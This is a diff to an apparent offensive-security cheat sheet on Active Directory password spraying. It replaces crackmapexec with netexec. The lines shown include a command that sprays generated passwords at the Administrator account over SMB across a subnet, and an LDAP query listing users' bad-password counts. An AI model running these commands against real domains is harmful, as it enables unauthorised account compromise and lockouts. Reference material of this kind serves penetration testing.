@@ -38,9 +38,9 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 ## Spray a pre-generated passwords list
 
-* Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+* Using `netexec` and `mp64` to generate passwords and spray them against SMB services on the network.
   ```powershell
-  crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+  netexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
   ```
 * Using `DomainPasswordSpray` to spray a password against all users of a domain.
   ```powershell
@@ -74,7 +74,7 @@ Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 > The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.
 
 ```powershell
-$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
+$ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
 LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
 LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
 ```
